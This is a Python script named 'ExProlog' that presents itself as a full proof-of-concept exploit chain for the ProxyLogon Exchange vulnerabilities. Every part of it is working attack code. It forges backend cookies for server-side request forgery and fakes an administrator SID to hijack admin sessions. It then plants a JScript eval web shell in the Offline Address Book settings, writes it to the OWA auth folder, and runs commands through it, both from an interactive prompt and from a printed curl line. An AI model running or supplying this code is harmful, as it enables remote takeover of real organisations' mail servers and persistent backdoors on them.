# -*- coding: utf-8 -*-
import click
import requests
import random
import string
import time
import sys
from urllib3.exceptions import InsecureRequestWarning
from pyfiglet import Figlet

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
color_reset = '\x1b[0m'
color_info = '\x1b[32m'
color_success = '\x1b[34m'
color_error = '\x1b[91m'


def random_char(size=3, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


random_endpoint = random_char(3) + '.js'
random_shell_name = random_char(5) + '.aspx'
user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:86.0) Gecko/20100101 Firefox/86.0'
shell_path = '\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s' % random_shell_name
shell_payload = 'http://ooo/#<script language="JScript" runat="server">function Page_Load(){eval(Request["request"],"unsafe");}</script>'


def fqdn(target):
    print("%s[#] Trying to get target FQDN%s" % (color_info, color_reset))
    fqdn = ""
    ct = requests.get("https://%s/ecp/%s" % (target, random_endpoint),
                      headers={
                          "Cookie": "X-BEResource=localhost~1942062522",
                          "User-Agent": user_agent
                      },
                      verify=False)
    if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
        fqdn = ct.headers["X-FEServer"]
        print("%s[+] Got target FQDN: %s%s" %
              (color_success, color_reset, fqdn))

        return fqdn
    else:
        print("%s[!] Failed to get FQDN%s" % (color_error, color_reset))
        exit()


def auto_discover(target, fqdn, email):
    body_payload = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>""" % email

    print("%s[#] Trying to get target LegacyDN and ServerID%s" %
          (color_info, color_reset))
    ct = requests.post(
        "https://%s/ecp/%s" % (target, random_endpoint),
        headers={
            "Cookie":
            "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" %
            fqdn,
            "Content-Type":
            "text/xml",
            "User-Agent":
            user_agent
        },
        data=body_payload,
        verify=False)

    if ct.status_code != 200:
        print("%s[!] Error sending autodiscover%s" %
              (color_error, color_reset))
        exit()
    if "<LegacyDN>" not in ct.text:
        print("%s[!] Failed to get LegacyDN%s" % (color_error, color_reset))
        exit()
    if "<Server>" not in ct.text:
        print("%s[!] Failed to get ServerID%s" % (color_error, color_reset))
        exit()

    legacy_dn = ct.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
    server_id = ct.text.split("<Server>")[1].split("</Server>")[0]
    sid = server_id.split("@")[0]
    print("%s[+] Got target LegacyDN: %s%s" %
          (color_success, color_reset, legacy_dn))
    print("%s[+] Got target ServerID: %s%s" %
          (color_success, color_reset, sid))

    return legacy_dn, server_id


def get_user_sid(target, fqdn, legacy_dn, server_id):
    mapi_bytes = "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
    body_payload = legacy_dn + mapi_bytes

    print("%s[#] Trying to get target user SID%s" % (color_info, color_reset))
    ct = requests.post(
        "https://%s/ecp/%s" % (target, random_endpoint),
        headers={
            "Cookie":
            "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;"
            % (fqdn, server_id),
            "Content-Type":
            "application/mapi-http",
            "X-Requesttype":
            "Connect",
            "X-Clientinfo":
            "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
            "X-Clientapplication":
            "Outlook/15.0.4815.1002",
            "X-Requestid":
            "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
            "User-Agent":
            user_agent
        },
        data=body_payload,
        verify=False)

    if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.text:
        print("%s[!] Failed to get user SID%s" % (color_error, color_reset))
        exit()

    user_sid = ct.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
    if user_sid.split("-")[-1] != "500":
        print("%s[-] User SID not an administrator, fixing user SID%s" %
              (color_success, color_reset))
        base_sid = user_sid.split("-")[:-1]
        base_sid.append("500")
        user_sid = "-".join(base_sid)

        print("%s[+] Got target administrator SID: %s%s" %
              (color_success, color_reset, user_sid))
    else:
        print("%s[+] Got target administrator SID: %s%s" %
              (color_success, color_reset, user_sid))

    return user_sid


def proxy_logon(target, fqdn, user_sid):
    body_payload = """<r at="Negotiate" ln="Admin"><s>%s</s></r>""" % user_sid

    print("%s[#] Trying to get target administrator cookie sessions%s" %
          (color_info, color_reset))
    ct = requests.post(
        "https://%s/ecp/%s" % (target, random_endpoint),
        headers={
            "Cookie":
            "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;"
            % fqdn,
            "Content-Type":
            "text/xml",
            "msExchLogonMailbox":
            "%s" % user_sid,
            "User-Agent":
            user_agent
        },
        data=body_payload,
        verify=False)

    if ct.status_code != 241 or not "set-cookie" in ct.headers:
        print("%s[!] Failed to get administrator cookie sessions%s" %
              (color_error, color_reset))
        exit()

    session_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(
        ";")[0]
    session_canary = ct.headers['set-cookie'].split(
        "msExchEcpCanary=")[1].split(";")[0]

    print("%s[+] Got target administrator session ID: %s%s" %
          (color_success, color_reset, session_id))
    print("%s[+] Got target administrator canary session ID: %s%s" %
          (color_success, color_reset, session_canary))

    return session_id, session_canary


def get_default_oab(target,
                    fqdn,
                    user_sid,
                    session_id,
                    session_canary,
                    verify=False):
    if verify:
        print("%s[#] Verifying OABVirtualDirectory Shell%s" %
              (color_info, color_reset))
    else:
        print("%s[#] Trying to get target OABVirtualDirectory ID%s" %
              (color_info, color_reset))

    ct = requests.post(
        "https://%s/ecp/%s" % (target, random_endpoint),
        headers={
            "Cookie":
            "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s"
            % (fqdn, session_canary, session_id, session_canary),
            "Content-Type":
            "application/json; charset=utf-8",
            "Accept-Language":
            "en-US,en;q=0.5",
            "X-Requested-With":
            "XMLHttpRequest",
            "msExchLogonMailbox":
            "%s" % user_sid,
            "User-Agent":
            user_agent
        },
        json={
            "filter": {
                "Parameters": {
                    "__type":
                    "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "SelectedView": "",
                    "SelectedVDirType": "All"
                }
            },
            "sort": {}
        },
        verify=False)

    if ct.status_code != 200 or not "RawIdentity" in ct.text:
        print("%s[!] Failed to get OAB ID%s" % (color_error, color_reset))
        exit()

    if verify:
        aob_shell = ct.text.split('"ExternalUrl":"')[1].split('"')[0]
        if "Page_Load" in aob_shell:
            print("%s[+] AOB Shell verified%s" % (color_success, color_reset))
            print("%s[+] AOB Shell payload: %s%s" %
                  (color_success, color_reset, aob_shell))
        else:
            print("%s[!] Failed to verify AOB Shell%s" %
                  (color_error, color_reset))
            exit()
    else:
        aob_id = ct.text.split('"RawIdentity":"')[1].split('"')[0]
        print("%s[+] Got target AOB ID: %s%s" %
              (color_success, color_reset, aob_id))

        return aob_id


def oab_inject_shell(target, fqdn, user_sid, session_id, session_canary,
                     oab_id):
    body_payload = {
        "identity": {
            "__type": "Identity:ECP",
            "DisplayName": "OAB (Default Web Site)",
            "RawIdentity": oab_id
        },
        "properties": {
            "Parameters": {
                "__type":
                "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "ExternalUrl": shell_payload
            }
        }
    }

    print("%s[#] Trying to inject OABVirtualDirectory Shell%s" %
          (color_info, color_reset))

    ct = requests.post(
        "https://%s/ecp/%s" % (target, random_endpoint),
        headers={
            "Cookie":
            "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s"
            % (fqdn, session_canary, session_id, session_canary),
            "Content-Type":
            "application/json; charset=utf-8",
            "Accept-Language":
            "en-US,en;q=0.5",
            "X-Requested-With":
            "XMLHttpRequest",
            "msExchLogonMailbox":
            "%s" % user_sid,
            "User-Agent":
            user_agent
        },
        json=body_payload,
        verify=False)

    if ct.status_code != 200:
        print("%s[!] Failed to inject OABVirtualDirectory Shell%s" %
              (color_error, color_reset))
        exit()

    print("%s[+] Shell are injected%s" % (color_success, color_reset))


def oab_export_shell(target, fqdn, user_sid, session_id, session_canary,
                     oab_id):
    body_payload = {
        "identity": {
            "__type": "Identity:ECP",
            "DisplayName": "OAB (Default Web Site)",
            "RawIdentity": oab_id
        },
        "properties": {
            "Parameters": {
                "__type":
                "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "FilePathName": shell_path
            }
        }
    }

    print("%s[#] Trying to export OABVirtualDirectory Shell%s" %
          (color_info, color_reset))
    ct = requests.post(
        "https://%s/ecp/%s" % (target, random_endpoint),
        headers={
            "Cookie":
            "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s"
            % (fqdn, session_canary, session_id, session_canary),
            "Content-Type":
            "application/json; charset=utf-8",
            "Accept-Language":
            "en-US,en;q=0.5",
            "X-Requested-With":
            "XMLHttpRequest",
            "msExchLogonMailbox":
            "%s" % user_sid,
            "User-Agent":
            user_agent
        },
        json=body_payload,
        verify=False)

    if ct.status_code != 200:
        print("%s[!] Failed to export AOB Shell%s" %
              (color_error, color_reset))
        exit()

    print("%s[+] Shell are exported%s" % (color_success, color_reset))


def exec_shell(target):
    print("%s[#] Trying to execute shell%s" % (color_info, color_reset))
    time.sleep(5)

    body_payload = """request=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())"""
    ct = requests.post("https://%s/owa/auth/%s" % (target, random_shell_name),
                       headers={
                           "Content-Type": "application/x-www-form-urlencoded",
                           "User-Agent": user_agent
                       },
                       data=body_payload,
                       verify=False)

    if ct.status_code != 200:
        print(
            "%s[*] Failed to execute shell, but sometimes it works, just try to send the payload with CURL bellow%s"
            % (color_error, color_reset))

    if "USER INFORMATION" in ct.text:
        shell_response = ct.text.split("USER CLAIMS INFORMATION")[:-1]
        print("%s[+] Shell Executed%s\n" % (color_info, color_reset))
        print("".join(shell_response) + "\n")


def interactive_shell(target):
    time.sleep(5)
    ct = requests.get("https://%s/owa/auth/%s" % (target, random_shell_name),
                      headers={"User-Agent": user_agent},
                      verify=False)

    if ct.status_code != 200 or "OAB (Default Web Site)" not in ct.text:
        print("%s[*] Failed to execute shell command%s" %
              (color_error, color_reset))

    if "OAB (Default Web Site)" in ct.text:
        while True:
            input_cmd = input("[#] command: ")
            body_payload = """request=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())""" % input_cmd
            ct = requests.post(
                "https://%s/owa/auth/%s" % (target, random_shell_name),
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": user_agent
                },
                data=body_payload,
                verify=False)
            if ct.status_code != 200 or "OAB (Default Web Site)" not in ct.text:
                print("%s[*] Failed to execute shell command%s" %
                      (color_error, color_reset))
            else:
                shell_response = ct.text.split(
                    "Name                            :")[0]
                print(shell_response)


def curl_shell(target):
    curl_req = """curl --request POST --url https://%s/owa/auth/%s --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -k""" % (
        target, random_shell_name)
    print("%s[*] CURL Request: %s\n%s" %
          (color_success, color_reset, curl_req))


def exit_with_msg():
    ctx = click.get_current_context()
    ctx.fail("target and email is required!")


@click.command()
@click.option('-t',
              '--target',
              default='',
              help='MS Exchange Server (e.g. outlook.victim.corp).')
@click.option('-e',
              '--email',
              default='',
              help='Email (e.g. administrator@victim.corp).')
@click.option('-x',
              '--execute',
              default=False,
              help="Execute verification shell.")
@click.option('-i',
              '--interactive',
              default=False,
              help="Run interactive shell.")
def main(target, email, execute, interactive):
    """
    ExProlog - ProxyLogon Full Exploit Chain PoC\n
    (CVE-2021–26855, CVE-2021–26857, CVE-2021–26858, CVE-2021–27065)
    """

    banner = Figlet(font='graffiti')

    if target != '' and email != '':
        print(banner.renderText('ExProlog'))

        target_fqdn = fqdn(target)
        legacy_dn, server_id = auto_discover(target, target_fqdn, email)
        user_sid = get_user_sid(target, target_fqdn, legacy_dn, server_id)
        session_id, session_canary = proxy_logon(target, target_fqdn, user_sid)
        oab_id = get_default_oab(target, target_fqdn, user_sid, session_id,
                                 session_canary)
        oab_inject_shell(target, target_fqdn, user_sid, session_id,
                         session_canary, oab_id)
        get_default_oab(target,
                        target_fqdn,
                        user_sid,
                        session_id,
                        session_canary,
                        verify=True)
        oab_export_shell(target, target_fqdn, user_sid, session_id,
                         session_canary, oab_id)
        if execute:
            exec_shell(target)
        curl_shell(target)

        print("%s[*] DONE%s\n" % (color_success, color_reset))

        if interactive:
            print("%s[#] Run interactive shell%s" % (color_info, color_reset))
            interactive_shell(target)
    else:
        exit_with_msg()


if __name__ == '__main__':
    main()